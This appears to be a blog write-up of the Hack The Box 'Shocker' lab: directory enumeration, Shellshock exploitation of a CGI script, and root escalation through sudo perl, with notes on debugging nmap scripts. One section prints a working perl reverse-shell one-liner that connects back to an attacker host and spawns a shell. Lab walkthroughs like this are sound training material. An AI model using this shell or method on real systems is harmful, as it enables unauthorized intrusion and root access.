---
layout: post
title: HTB Shocker write-up
---

# **Recon**

`nmap` routine shows 2 TCP ports open on the target

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094035274/c913388e-a8d8-40b3-af52-2428eaa47c3b.png align="center")

directory enumeration on the Apache server is performed via `gobuster`

> Different wordlists may impact enumeration results

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094170011/98440997-56ad-4a85-affb-ab967b6c23ed.png align="center")

> `/cgi-bin` directory was discovered however the directory itself is not accessible (error code 403)

while we get a `403` trying to access `/cgi-bin` we could do a further dirbust to see if subsequent directories can be accessed

> always enumerate harder

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094267335/d9239033-d3a2-4956-a592-2088a5ce4f9a.png align="left")

> gobuster `-x` allows appending of file types, in this case according to the hints `/cgi-bin` is where apache stores scripts (`.pl, .sh` etc.) ref: [cgi enum wordlist](https://github.com/orwagodfather/WordList/blob/main/cgi-bin.txt) for more possible scripts that can be found

# Exploit

we notice that the Apache server is running an older version during recon phase, also given we find `.sh` shell scripts, we piece together two main keywords "apache" "shell script" to find the [CVE](https://www.exploit-db.com/exploits/34900) "Shellshock"

to test whether certain exploits are applicable we can first attempt to test our hypothesis using `nmap` scripts

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094289067/9b6d360f-308e-4739-aeeb-98631bf6854f.png align="left")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094294056/cf79f0d1-554f-4da4-ac39-03e5cdd1f9ca.png align="left")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094298992/86a826fc-8045-42d9-bdc4-1a32413e7009.png align="left")

knowing the server is indeed vulnerable, we can try to run to exploit to gain foothold

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094315245/6b8f3624-178d-43b9-b516-fc9f41fe0576.png align="left")

> some errors were caught and after some "try hardering" it was related to the exploit being written in python2

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094380361/6aea2aab-9941-4035-b33f-e9a5cabbf052.png align="left")

after successfully configuring the payload, we can access the user flag

# Priv Esc

due to the box being an easy one, this process is very much a low-hanging fruit

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094436484/b9e595fa-710c-49af-8dc1-45d94c88dcbc.png align="center")

a quick GTFObins tour and we can successfully escalate to root

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094449118/924b1f2e-e697-4afa-853b-4455d70e233a.png align="left")

## Alternative method

```bash
sudo perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

> this method spawns a reverse shell on your attacking machine instead

# Notes

> credits: ippsec [walkthrough](https://www.youtube.com/watch?v=IBlTdguhgfY)

* ## SSH, Apache version enumeration
    
    * crossref package version [site](https://packages.ubuntu.com) against different distro to enumerate which distro is being run
        
    * version last updated date = likely when the system was last updated 
        
* ## HTTP response `Content-Type`
    
    when accessing discovered scripts change the type to `text/plain` so the browser can display the content of the script. in the case where the browser cannot understand the extension, the content will not be displayed when visiting the site #http\_content-type
    
* ## HTTP/web-related `nmap` NSE script debugging
    
    in the case of `nmap` scripts failing, use burp proxy listener:
    
    * bind `localhost:8081` to `$target:$target_port` and `nmap` the `localhost`
        
    * start intercepting and debug the HTTP requests `nmap` sends
        
    * modify nse script accordingly #nmap
        
    
* ## RFC shenanigans
    
    * `nmap` shellshock scripts fail to list `cmd` response due to [RFC standards](https://www.rfc-editor.org/rfc/rfc9110.html): RFC HTTP response standards consist of `\r\n` delimiter between header and body
        
        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094558051/75af4457-eead-42bd-b0d7-ceed686d610e.png align="left")
        
        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094567545/d4c2a9c0-35bf-4f2c-b12b-e45f865485a5.png align="left")
        
        > `echo;` inserts a new line in the response, separating the header from the body (`ls` result) `/bin/ls` is used as `ls` returns negative results (alias/PATH not set)
